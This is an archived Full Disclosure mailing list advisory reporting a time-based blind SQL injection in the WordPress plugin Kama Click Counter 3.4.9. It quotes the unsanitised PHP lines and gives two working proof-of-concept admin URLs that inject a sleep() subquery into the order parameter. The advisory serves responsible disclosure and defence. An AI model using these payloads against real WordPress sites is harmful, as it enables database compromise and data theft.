=== Content from seclists.org_37f649a0_20250125_055439.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](66)
[By Date](date.html#67)
[![Next](/images/right-icon-16x16.png)](68)

[![Previous](/images/left-icon-16x16.png)](65)
[By Thread](index.html#67)
[![Next](/images/right-icon-16x16.png)](68)

![](/shared/images/nst-icons.svg#search)

# WordPress Plugin Kama Click Counter 3.4.9 - Blind SQL Injection

---

*From*: Manuel Garcia Cardenas <advidsec () gmail com>

*Date*: Mon, 27 Feb 2017 08:04:48 +0100

---

```
=============================================
MGC ALERT 2017-002
- Original release date: February 21, 2017
- Last revised:  February 28, 2017
- Discovered by: Manuel García Cárdenas
- Severity: 7,1/10 (CVSS Base Score)
=============================================

I. VULNERABILITY
-------------------------
WordPress Plugin Kama Click Counter 3.4.9 - Blind SQL Injection

II. BACKGROUND
-------------------------
Using this plugin you will have statistics on clicks on your files or any
other link (not file).

III. DESCRIPTION
-------------------------
This bug was found using the portal in the
/wp-content/plugins/kama-clic-counter/admin.php file.

In the line 172,173 do not sanitize the input values.

$order_by = ($x= & $_GET['order_by']) ? esc_sql($x) : 'link_date';
$order    = ($x= & $_GET['order']) ? esc_sql($x) : 'DESC';

And in the line 182 or 186 the sql sentence is executed:

$sql = "SELECT * FROM $wpdb->kcc_clicks WHERE link_url LIKE '%$s%' OR
link_name LIKE '%$s%' ORDER BY $order_by $order LIMIT $offset, $limit";
$sql = "SELECT * FROM $wpdb->kcc_clicks ORDER BY $order_by $order LIMIT
$offset, $limit";

To exploit the vulnerability only is needed use the version 1.0 of the HTTP
protocol to interact with the application.

It is possible to inject SQL code.

IV. PROOF OF CONCEPT
-------------------------
The following URL have been confirmed to all suffer from Time Based SQL
Injection.

Time Based SQL Injection POC:

/wordpress/wp-admin/admin.php?page=kama-clic-counter&order_by=link_name&order=ASC%2c(select*from(select(sleep(2)))a)&paged=1
(2 seconds of response)

/wordpress/wp-admin/admin.php?page=kama-clic-counter&order_by=link_name&order=ASC%2c(select*from(select(sleep(30)))a)&paged=1
(30 seconds of response)

V. BUSINESS IMPACT
-------------------------
Public defacement, confidential data leakage, and database server
compromise can result from these attacks. Client systems can also be
targeted, and complete compromise of these client systems is also possible.

VI. SYSTEMS AFFECTED
-------------------------
Kama Click Counter <= 3.4.9

VII. SOLUTION
-------------------------
Disable the plugin until a fix is available.

VIII. REFERENCES
-------------------------
<https://wordpress.org/plugins-wp/kama-clic-counter/>

IX. CREDITS
-------------------------
This vulnerability has been discovered and reported
by Manuel García Cárdenas (advidsec (at) gmail (dot) com).

X. REVISION HISTORY
-------------------------
February 21, 2017 1: Initial release
February 28, 2017 2: Revision to send to lists

XI. DISCLOSURE TIMELINE
-------------------------
February 21, 2017 1: Vulnerability acquired by Manuel Garcia Cardenas
February 21, 2017 2: Send to vendor
February 24, 2017 3: New contact with vendor without response
February 28, 2017 4: Send to the Full-Disclosure lists

XII. LEGAL NOTICES
-------------------------
The information contained within this advisory is supplied "as-is" with no
warranties or guarantees of fitness of use or otherwise.

XIII. ABOUT
-------------------------
Manuel Garcia Cardenas
Pentester

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](66)
[By Date](date.html#67)
[![Next](/images/right-icon-16x16.png)](68)

[![Previous](/images/left-icon-16x16.png)](65)
[By Thread](index.html#67)
[![Next](/images/right-icon-16x16.png)](68)

### Current thread:

* **WordPress Plugin Kama Click Counter 3.4.9 - Blind SQL Injection** *Manuel Garcia Cardenas (Feb 27)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


